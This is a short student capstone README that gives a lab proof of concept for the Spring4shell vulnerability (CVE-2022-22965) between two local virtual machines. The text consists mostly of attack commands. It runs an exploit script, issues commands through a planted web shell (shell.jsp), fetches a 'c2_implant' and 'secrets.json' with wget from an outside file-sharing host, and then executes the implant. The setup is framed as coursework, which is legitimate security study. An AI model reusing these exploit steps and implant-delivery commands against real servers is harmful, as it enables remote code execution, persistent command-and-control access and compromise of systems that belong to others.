# 590J Captsone Project
Group Counting Sheep:
Brendan Henrich
Andrew Maldonado
Basundhara Chakrabarty

# Spring4shell Implant Delivery 
# CVE-2022-22965

# Proof of Concept Setup
2x Virtual Machines [Host OS Windows 10] running Ubuntu 20.04.4 LTS
Local network DCHP 10.0.2.0/24

Attacker IP = 10.0.2.15
Target IP = 10.0.2.4

Target is running vulnerable Spring server !

# Instructions:
Start here: https://medium.com/geekculture/spring4shell-exploit-walkthrough-9843c0244b68
On Target: [run the vulnerable spring server]
cd spring4shell
sudo docker run -p 80:8080 spring4shell

On Attacker: [launch the attack]:
cd spring4shell
python3 exploit.py --url 'http://10.0.2.4/helloworld/greeting'

# WEB SHELL COMMANDS:
lynx -dump http://10.0.2.4/shell.jsp?cmd=whoami
lynx -dump http://10.0.2.4/shell.jsp?cmd=echo%20spring4shell
lynx -dump http://10.0.2.4/shell.jsp?cmd=ls
lynx -dump http://10.0.2.4/shell.jsp?cmd=ls%20-l%20/

# LOAD the implant:
lynx -dump http://10.0.2.4/shell.jsp?cmd=wget%20-q%20https://get.station307.com/XGHo3dJDb31/c2_implant
lynx -dump http://10.0.2.4/shell.jsp?cmd=wget%20-q%20https://get.station307.com/nScoTrBugqc/secrets.json

# RUN the implant:
lynx -dump http://10.0.2.4/shell.jsp?cmd=%2e%2fc2_implant
